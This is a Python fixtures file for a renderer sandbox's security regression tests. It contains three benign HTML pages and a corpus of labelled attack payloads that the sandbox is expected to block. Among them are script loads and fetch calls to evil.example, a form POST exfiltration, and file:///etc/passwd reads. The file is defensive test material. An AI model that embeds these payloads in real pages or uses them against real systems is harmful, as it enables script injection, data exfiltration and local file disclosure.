"""W0-A spike: HTML fixtures for the feasibility and security corpus.

Two fixture sets back the W0-A gate:

* ``BENIGN_FIXTURES`` — three reference pages (static layout, CSS-keyframe
  animation, asset/font references) used to prove seek determinism and RGBA
  readback on a candidate backend.

* ``ATTACK_FIXTURES`` — twenty-plus malicious HTML/CSS payloads, each tagged
  with the capability it tries to abuse.  The runtime sandbox (CSP + URL
  policy) must deny every one of them; the corpus is the regression target for
  FH-12/W0-A "no network, no file, no script, no escape".

Fixtures are intentionally inline strings so the spike has no external file
dependencies and so each attack is auditable in source.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class HtmlFixture:
    """A single HTML fixture with an id, category and the raw source."""

    fixture_id: str
    category: str
    description: str
    html: str
    bound_asset_ids: tuple[str, ...] = ()


# ---------------------------------------------------------------------------
# Benign fixtures: the pages a real renderer must capture deterministically.
# ---------------------------------------------------------------------------

BENIGN_FIXTURES: tuple[HtmlFixture, ...] = (
    HtmlFixture(
        fixture_id="benign_static_title",
        category="benign_static",
        description="Static dark title card with two text lines; no animation, no assets.",
        html=(
            "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><style>"
            "html,body{margin:0;padding:0;width:320px;height:180px;"
            "background:#0b1220;color:#e5e7eb;font-family:sans-serif}"
            "h1{font-size:24px;margin:24px 0 8px 24px}"
            "p{font-size:14px;margin:0 0 0 24px;color:#93c5fd}"
            "</style></head><body><h1>AI Agent</h1><p>Four Steps</p></body></html>"
        ),
    ),
    HtmlFixture(
        fixture_id="benign_css_keyframes",
        category="benign_animated",
        description="Card that translates via @keyframes; determinism depends on seek, not wall-clock.",
        html=(
            "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><style>"
            "html,body{margin:0;padding:0;width:320px;height:180px;background:#0b1220}"
            ".card{position:absolute;left:24px;top:60px;width:80px;height:60px;"
            "background:#f59e0b;border-radius:8px;"
            "animation:slide 1s linear infinite alternate}"
            "@keyframes slide{from{left:24px}to{left:216px}}"
            "</style></head><body><div class=\"card\"></div></body></html>"
        ),
    ),
    HtmlFixture(
        fixture_id="benign_asset_and_font",
        category="benign_asset",
        description="References a bound topos-asset image and font; must resolve offline, no network.",
        html=(
            "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><style>"
            "@font-face{font-family:'Topos';src:url(topos-asset://font_brand)}"
            "html,body{margin:0;padding:0;width:320px;height:180px;background:#111827}"
            ".logo{font-family:'Topos';color:#fff;font-size:20px;margin:16px}"
            "img{position:absolute;right:16px;top:16px;width:64px;height:64px}"
            "</style></head><body>"
            "<div class=\"logo\">Topos</div>"
            "<img src=\"topos-asset://logo_png\" alt=\"logo\">"
            "</body></html>"
        ),
        bound_asset_ids=("font_brand", "logo_png"),
    ),
)


# ---------------------------------------------------------------------------
# Attack corpus: every capability-abuse vector the sandbox must block.
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class AttackFixture(HtmlFixture):
    """A malicious fixture tagged with the vector it exercises and the denial reason."""
    vector: str = ""              # e.g. "script", "network", "file"
    expected_denial_reason: str = ""


ATTACK_FIXTURES: tuple[AttackFixture, ...] = (
    AttackFixture(
        fixture_id="attack_script_inline",
        category="attack_script",
        vector="script",
        expected_denial_reason="script_blocked",
        description="Inline <script> must never execute.",
        html="<html><body><script>document.title='x'</script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_script_external",
        category="attack_script",
        vector="script",
        expected_denial_reason="network_scheme_blocked",
        description="External <script src=https://...> must be blocked at network layer.",
        html="<html><body><script src=\"https://evil.example/a.js\"></script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_event_handler",
        category="attack_script",
        vector="script",
        expected_denial_reason="inline_event_handler_blocked",
        description="Inline event handler attributes are script execution.",
        html="<html><body><img src=x onerror=\"alert(1)\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_javascript_uri",
        category="attack_script",
        vector="script",
        expected_denial_reason="javascript_uri_blocked",
        description="javascript: URI must be denied.",
        html="<html><body><a href=\"javascript:alert(1)\">x</a></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_network_img",
        category="attack_network",
        vector="network",
        expected_denial_reason="network_scheme_blocked",
        description="<img src=https://...> must not fetch.",
        html="<html><body><img src=\"https://evil.example/track.png\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_network_css_import",
        category="attack_network",
        vector="network",
        expected_denial_reason="css_import_blocked",
        description="@import of remote stylesheet must be blocked.",
        html="<html><head><style>@import url('https://evil.example/x.css');</style></head><body>x</body></html>",
    ),
    AttackFixture(
        fixture_id="attack_network_background_url",
        category="attack_network",
        vector="network",
        expected_denial_reason="network_scheme_blocked",
        description="CSS background url(http://...) must not fetch.",
        html="<html><head><style>body{background:url(http://evil.example/bg.png)}</style></head><body>x</body></html>",
    ),
    AttackFixture(
        fixture_id="attack_network_xhr",
        category="attack_network",
        vector="network",
        expected_denial_reason="network_scheme_blocked",
        description="XMLHttpRequest/fetch to network must be blocked (script-free anyway).",
        html="<html><body><script>fetch('//evil.example')</script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_file_scheme_img",
        category="attack_file",
        vector="file",
        expected_denial_reason="file_scheme_blocked",
        description="<img src=file://...> must not read local files.",
        html="<html><body><img src=\"file:///etc/passwd\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_file_scheme_css",
        category="attack_file",
        vector="file",
        expected_denial_reason="file_scheme_blocked",
        description="CSS url(file://...) must not read local files.",
        html="<html><head><style>body{background:url(file:///etc/passwd)}</style></head><body>x</body></html>",
    ),
    AttackFixture(
        fixture_id="attack_absolute_path_img",
        category="attack_file",
        vector="file",
        expected_denial_reason="relative_or_missing_scheme",
        description="Absolute path references must be denied (no scheme).",
        html="<html><body><img src=\"/etc/passwd\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_data_uri_oversized",
        category="attack_data",
        vector="data_uri",
        expected_denial_reason="data_uri_blocked",
        description="Oversized data: URI is an explosion/exfiltration vector.",
        html="<html><body><img src=\"data:image/png;base64,AAAA\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_data_uri_css",
        category="attack_data",
        vector="data_uri",
        expected_denial_reason="data_uri_blocked",
        description="data: stylesheet must be blocked.",
        html="<html><head><link rel=\"stylesheet\" href=\"data:text/css,body{color:red}\"></head><body>x</body></html>",
    ),
    AttackFixture(
        fixture_id="attack_blob_uri",
        category="attack_data",
        vector="data_uri",
        expected_denial_reason="blob_uri_blocked",
        description="blob: URI must be blocked.",
        html="<html><body><img src=\"blob:https://evil.example/uuid\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_iframe_embed",
        category="attack_frame",
        vector="frame",
        expected_denial_reason="iframe_blocked",
        description="<iframe> must never embed external content.",
        html="<html><body><iframe src=\"https://evil.example\"></iframe></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_object_embed",
        category="attack_frame",
        vector="frame",
        expected_denial_reason="object_blocked",
        description="<object>/<embed> plugins must be blocked.",
        html="<html><body><object data=\"https://evil.example\"></object></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_popup_window",
        category="attack_popup",
        vector="popup",
        expected_denial_reason="popup_blocked",
        description="window.open / target=_blank must be blocked.",
        html="<html><body><a href=\"https://evil.example\" target=\"_blank\">x</a></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_form_exfil",
        category="attack_form",
        vector="network",
        expected_denial_reason="form_blocked",
        description="Form POST to network must be blocked (form-action 'none').",
        html="<html><body><form action=\"https://evil.example\"><input name=d></form></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_storage_persist",
        category="attack_storage",
        vector="storage",
        expected_denial_reason="storage_blocked",
        description="localStorage/cookies must not persist across captures (ephemeral profile).",
        html="<html><body><script>localStorage.setItem('x',1)</script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_permission_api",
        category="attack_permission",
        vector="permission",
        expected_denial_reason="permission_blocked",
        description="Permissions API (geo/camera) must be disabled.",
        html="<html><body><script>navigator.permissions.query({name:'geolocation'})</script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_webgl_canvas",
        category="attack_gpu_api",
        vector="gpu_api",
        expected_denial_reason="gpu_api_blocked",
        description="WebGL/WebGPU authored content must be disabled.",
        html="<html><body><canvas id=c></canvas><script>c.getContext('webgl')</script></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_download_link",
        category="attack_download",
        vector="download",
        expected_denial_reason="download_blocked",
        description="download attribute must not trigger file downloads.",
        html="<html><body><a href=\"https://evil.example/x\" download>x</a></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_unbound_asset",
        category="attack_asset",
        vector="asset",
        expected_denial_reason="asset_id_not_bound",
        description="topos-asset://<unbound> must be denied; only bound ids resolve.",
        html="<html><body><img src=\"topos-asset://not_registered\"></body></html>",
    ),
    AttackFixture(
        fixture_id="attack_css_expression",
        category="attack_css",
        vector="css_expression",
        expected_denial_reason="css_expression_blocked",
        description="Legacy CSS expression() must be stripped/blocked.",
        html="<html><head><style>body{width:expression(alert(1))}</style></head><body>x</body></html>",
    ),
)


def benign_by_id(fixture_id: str) -> HtmlFixture | None:
    return next((f for f in BENIGN_FIXTURES if f.fixture_id == fixture_id), None)


def attack_by_id(fixture_id: str) -> AttackFixture | None:
    return next((f for f in ATTACK_FIXTURES if f.fixture_id == fixture_id), None)


def attack_vectors() -> tuple[str, ...]:
    """Distinct abuse vectors covered by the corpus (for matrix reporting)."""
    seen: list[str] = []
    for fixture in ATTACK_FIXTURES:
        if fixture.vector not in seen:
            seen.append(fixture.vector)
    return tuple(seen)


__all__ = [
    "ATTACK_FIXTURES",
    "AttackFixture",
    "BENIGN_FIXTURES",
    "HtmlFixture",
    "attack_by_id",
    "attack_vectors",
    "benign_by_id",
]
